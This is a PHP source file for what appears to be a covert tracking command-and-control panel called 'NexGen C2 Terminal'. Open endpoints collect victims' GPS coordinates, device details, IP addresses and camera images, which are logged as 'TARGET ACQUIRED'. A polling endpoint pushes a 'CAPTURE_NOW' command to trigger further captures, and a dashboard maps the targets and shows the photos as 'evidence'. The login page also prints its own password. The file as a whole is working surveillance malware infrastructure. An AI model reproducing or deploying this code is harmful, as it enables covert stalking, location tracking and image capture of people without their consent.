<?php
session_start();
ini_set('upload_max_filesize', '10M');
ini_set('post_max_size', '10M');
ini_set('memory_limit', '128M');

// === AUTH PROTECTION ===
if (!isset($_GET['lat']) && !isset($_GET['long']) && $_SERVER['REQUEST_METHOD'] !== 'POST' && !isset($_GET['check_cmd'])) {
    if (basename($_SERVER['PHP_SELF']) !== 'login.php') {
        if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
            header('Location: login.php');
            exit;
        }
    }
}

$logFile = "location.txt";
$screenshotDir = "captures/";
$commandFile = "cmd.txt";
$admin_password = "odmin1";

if (!file_exists($screenshotDir)) { mkdir($screenshotDir, 0777, true); }

// === GPS HANDLER ===
if (isset($_GET['lat']) && isset($_GET['long'])) {
    $lat = $_GET['lat'];
    $long = $_GET['long'];
    $acc = $_GET['acc'] ?? 'N/A';
    $model = isset($_GET['model']) ? urldecode($_GET['model']) : 'Generic Device';
    $res = $_GET['res'] ?? 'Unknown';
    $ip = $_SERVER["REMOTE_ADDR"];
    $timestamp = date('Y-m-d H:i:s');
    
    $mapLink = "https://www.google.com/maps?q=$lat,$long";

    $logEntry = "--- TARGET ACQUIRED ---\n" .
                "Time: $timestamp\n" .
                "Device: $model | Res: $res\n" .
                "GPS: $lat, $long (Acc: {$acc}m)\n" .
                "MAP: <a href=\"$mapLink\" target=\"_blank\">Open in Google Maps</a>\n" .
                "IP: $ip\n" .
                "-----------------------\n";

    file_put_contents($logFile, $logEntry, FILE_APPEND);
    file_put_contents($commandFile, "CAPTURE_NOW");
    exit; 
}

// === IMAGE UPLOAD HANDLER ===
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $json = file_get_contents('php://input');
    $data = json_decode($json, true);

    if (isset($data['image'])) {
        $img = $data['image'];
        $ext = (strpos($img, 'data:image/jpeg') !== false) ? '.jpg' : '.png';
        $img = str_replace(['data:image/jpeg;base64,', 'data:image/png;base64,', ' '], ['', '', '+'], $img);
        $imgData = base64_decode($img);

        $uniqueID = date('His') . '_' . uniqid();
        $photoPath = $screenshotDir . 'INTEL_' . $uniqueID . $ext;
        $descPath = $screenshotDir . 'INTEL_' . $uniqueID . '.txt';
        
        file_put_contents($photoPath, $imgData);
        
        $model = $data['model'] ?? "Mobile Device";
        $ua = $_SERVER['HTTP_USER_AGENT'];
        $ip = $_SERVER["REMOTE_ADDR"];
        
        $desc = "--- IMAGE METADATA ---\nTime: " . date('Y-m-d H:i:s') . "\nDevice: $model\nIP: $ip\nUA: $ua";
        file_put_contents($descPath, $desc);
        file_put_contents($logFile, "[PIC] Captured from $model ($ip)\n", FILE_APPEND);

        echo json_encode(['status' => 'success']);
        exit;
    }
}

// === COMMAND POLLING ===
if (isset($_GET['check_cmd'])) {
    if (file_exists($commandFile)) { echo file_get_contents($commandFile); unlink($commandFile); }
    else { echo "IDLE"; } exit;
}

// === LOGIN HANDLER ===
if (basename($_SERVER['PHP_SELF']) === 'login.php' && isset($_POST['password'])) {
    if ($_POST['password'] === $admin_password) {
        $_SESSION['logged_in'] = true;
        header('Location: dashboard.php');
        exit;
    } else {
        $login_error = "Wrong password!";
    }
}
?>

<?php if (basename($_SERVER['PHP_SELF']) === 'login.php'): ?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NexGen | Admin Login</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Rajdhani:wght@600&display=swap" rel="stylesheet">
    <style>
        body { background: #050505; color: #fff; font-family: 'Rajdhani', sans-serif; margin: 0; padding: 0; height: 100vh; display: flex; align-items: center; justify-content: center; }
        .login-box { background: rgba(17,17,17,0.8); backdrop-filter: blur(10px); border: 1px solid #333; border-radius: 20px; padding: 40px; width: 350px; text-align: center; box-shadow: 0 0 30px rgba(0,242,254,0.3); }
        h1 { font-family: 'Orbitron', sans-serif; color: #00f2fe; text-shadow: 0 0 10px #00f2fe; margin-bottom: 30px; }
        input[type="password"] { width: 100%; padding: 15px; margin: 20px 0; background: #000; border: 1px solid #333; border-radius: 10px; color: #fff; font-size: 16px; }
        button { background: #00f2fe; color: #000; border: none; padding: 15px 30px; border-radius: 10px; font-weight: bold; font-size: 16px; cursor: pointer; transition: 0.3s; }
        button:hover { background: #00c0cc; transform: scale(1.05); }
        .error { color: #ff3b30; margin-top: 15px; }
    </style>
</head>
<body>
    <div class="login-box">
        <h1>NEXGEN TERMINAL</h1>
        <form method="POST">
            <input type="password" name="password" placeholder="Enter Admin Password" required autofocus>
            <button type="submit">ACCESS TERMINAL</button>
        </form>
        <?php if (isset($login_error)): ?><div class="error"><?= htmlspecialchars($login_error) ?></div><?php endif; ?>
        <p style="margin-top:30px; color:#666; font-size:12px;">Password hint: odmin1</p>
    </div>
</body>
</html>
<?php exit; endif; ?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>NexGen | C2 Terminal</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Rajdhani:wght@400;600&display=swap" rel="stylesheet">
    <style>
        :root { --neon: #00f2fe; --danger: #ff3b30; --bg: #050505; --panel: #111; --glass: rgba(20,20,20,0.6); }
        body { background: var(--bg); color: #fff; font-family: 'Rajdhani', sans-serif; margin: 0; padding: 20px; }
        .header { display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid var(--neon); padding-bottom: 10px; margin-bottom: 30px; }
        .header h1 { font-family: 'Orbitron', sans-serif; font-size: 24px; color: var(--neon); text-shadow: 0 0 15px var(--neon); margin:0; }
        .logout { color: var(--danger); font-size: 14px; text-decoration: none; }

        .dashboard-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 25px; }
        @media (max-width: 1200px) { .dashboard-grid { grid-template-columns: 1fr; } }

        .card { background: var(--panel); border: 1px solid #333; border-radius: 12px; padding: 20px; }

        .gallery { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 20px; }
        .evidence-card {
            background: var(--glass);
            backdrop-filter: blur(12px);
            border: 1px solid rgba(0,242,254,0.2);
            border-radius: 16px;
            overflow: hidden;
            box-shadow: 0 8px 32px rgba(0,242,254,0.1);
            transition: all 0.4s ease;
        }
        .evidence-card:hover {
            transform: translateY(-12px);
            box-shadow: 0 25px 50px rgba(0,242,254,0.25);
            border-color: var(--neon);
        }
        .evidence-card img {
            width: 100%;
            height: 220px;
            object-fit: cover;
            cursor: pointer;
            transition: transform 0.4s;
        }
        .evidence-card img:hover { transform: scale(1.08); }
        .evidence-desc {
            padding: 16px;
            background: rgba(0,0,0,0.7);
            font-family: 'Courier New', monospace;
            font-size: 12px;
            line-height: 1.7;
            color: #ccc;
        }
        .evidence-desc strong { color: var(--neon); }

        .map-container { height: 500px; border: 1px solid #333; border-radius: 12px; overflow: hidden; }
        .map-frame { width: 100%; height: 100%; border: none; }

        .log-box { height: 500px; overflow-y: auto; background: #000; padding: 15px; font-family: 'Courier New', monospace; font-size: 12px; border: 1px solid #222; color: #00ff41; }

        .placeholder {
            text-align: center;
            padding: 60px 20px;
            color: #666;
            grid-column: 1 / -1;
        }
        .placeholder-icon { font-size: 64px; opacity: 0.3; margin-bottom: 20px; }
    </style>
</head>
<body>

<div class="header">
    <h1>NEXGEN INTELLIGENCE TERMINAL</h1>
    <div>[ STATUS: MONITORING ] | <a href="?logout=1" class="logout">LOGOUT</a></div>
</div>

<?php
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: login.php');
    exit;
}

// Parse GPS locations for map
$gpsLocations = [];
$allMapsLink = '';

if (file_exists($logFile)) {
    $lines = file($logFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    foreach ($lines as $line) {
        if (preg_match('/^GPS:\s*([-\d.]+),\s*([-\d.]+)\s*/', $line, $matches)) {
            $lat = trim($matches[1]);
            $lon = trim($matches[2]);
            if (is_numeric($lat) && is_numeric($lon)) {
                $gpsLocations[] = "$lat,$lon";
            }
        }
    }
    $gpsLocations = array_unique($gpsLocations);
    if (!empty($gpsLocations)) {
        $query = implode('|', $gpsLocations);
        $allMapsLink = "https://www.google.com/maps/search/?api=1&query=$query";
    }
}
?>

<div class="dashboard-grid">

    <!-- VISUAL EVIDENCE SECTION -->
    <div class="main-column">
        <h2 style="font-size: 18px; color: var(--neon); margin-bottom: 20px; display:flex; align-items:center; gap:12px;">
            VISUAL EVIDENCE 
            <span style="font-size:13px; color:#888; font-weight:normal;">(IP & LOC TAGGED)</span>
        </h2>

        <div class="gallery">
            <?php
            $images = glob($screenshotDir . "*.{png,jpg,jpeg}", GLOB_BRACE);

            if ($images) {
                array_multisort(array_map('filemtime', $images), SORT_DESC, $images);

                foreach ($images as $img) {
                    $pathInfo = pathinfo($img);
                    $txtFile = $screenshotDir . $pathInfo['filename'] . '.txt';
                    
                    $timestamp = date('Y-m-d H:i:s', filemtime($img));
                    $device = "Unknown Device";
                    $ip = "Unknown IP";
                    $location = "Location Denied";

                    $metaLines = file_exists($txtFile) ? explode("\n", file_get_contents($txtFile)) : [];

                    foreach ($metaLines as $line) {
                        if (strpos($line, "Time:") !== false) $timestamp = trim(substr($line, 6));
                        if (strpos($line, "Device:") !== false) $device = trim(substr($line, 8));
                        if (strpos($line, "IP:") !== false) $ip = trim(substr($line, 4));
                    }

                    // Fallback: try to get recent GPS from main log
                    if (file_exists($logFile)) {
                        $logContent = file_get_contents($logFile);
                        if (preg_match('/GPS:\s*([-\d.]+),\s*([-\d.]+).*?IP:\s*([^\n]+)/s', $logContent, $m)) {
                            if ($location === "Location Denied") {
                                $mapLink = "https://www.google.com/maps?q={$m[1]},{$m[2]}";
                                $location = "<a href='$mapLink' target='_blank' style='color:var(--neon);'>{$m[1]}, {$m[2]}</a> (recent)";
                            }
                        }
                    }

                    echo "
                    <div class='evidence-card'>
                        <img src='$img' onclick='window.open(this.src)' alt='Captured Evidence'>
                        <div class='evidence-desc'>
                            <strong>CAPTURED INTEL</strong><br>
                            <strong>Time:</strong> $timestamp<br>
                            <strong>Device:</strong> $device<br>
                            <strong>IP:</strong> $ip<br>
                            <strong>Location:</strong> $location<br>
                            <hr style='border:0; border-top:1px solid #444; margin:12px 0;'>
                            <small style='color:#888;'>
                                " . (file_exists($txtFile) ? "Full metadata captured" : "Partial intel • Permissions limited") . "
                            </small>
                        </div>
                    </div>";
                }
            } else {
                echo "<div class='placeholder'>
                        <div class='placeholder-icon'>📷</div>
                        <h3>No Visual Evidence Captured Yet</h3>
                        <p>Waiting for targets to grant camera access...</p>
                        <div style='margin-top:30px; padding:20px; background:#111; border-radius:12px; font-family:monospace; font-size:13px; color:#0f0;'>
                            <strong>Latest Activity (No Photo):</strong><br>";
                
                if (file_exists($logFile)) {
                    $content = file_get_contents($logFile);
                    $entries = explode("--- TARGET ACQUIRED ---", $content);
                    $last = end($entries);
                    echo nl2br(htmlspecialchars(trim($last))) ?: "No recent activity.";
                } else {
                    echo "No logs available.";
                }
                
                echo "    </div>
                      </div>";
            }
            ?>
        </div>
    </div>

    <!-- SIDEBAR: MAP + LOGS -->
    <div class="sidebar">
        <div class="card">
            <h2 style="font-size:16px; margin-top:0; color: var(--neon);">
                TARGET LOCATIONS MAP 
                <?php if ($allMapsLink): ?>
                    <a href="<?= $allMapsLink ?>" target="_blank" style="font-size:12px; color:var(--neon); margin-left:10px;">[OPEN FULL MAP]</a>
                <?php endif; ?>
            </h2>
            <div class="map-container">
                <?php if (!empty($gpsLocations)): ?>
                    <iframe class="map-frame" src="https://www.google.com/maps/embed/v1/search?key=&q=<?= urlencode(implode('|', $gpsLocations)) ?>"></iframe>
                <?php else: ?>
                    <div style="display:flex; align-items:center; justify-content:center; height:100%; color:#666; font-size:14px;">
                        No GPS locations captured yet.<br>Waiting for location access...
                    </div>
                <?php endif; ?>
            </div>
        </div>

        <div class="card" style="margin-top:25px;">
            <h2 style="font-size:16px; margin-top:0; color: var(--neon);">RAW GPS LOGS</h2>
            <div class="log-box">
                <?php
                if(file_exists($logFile)) {
                    echo nl2br(htmlspecialchars(file_get_contents($logFile)));
                } else {
                    echo "No logs yet.";
                }
                ?>
            </div>
        </div>
    </div>
</div>

</body>
</html>
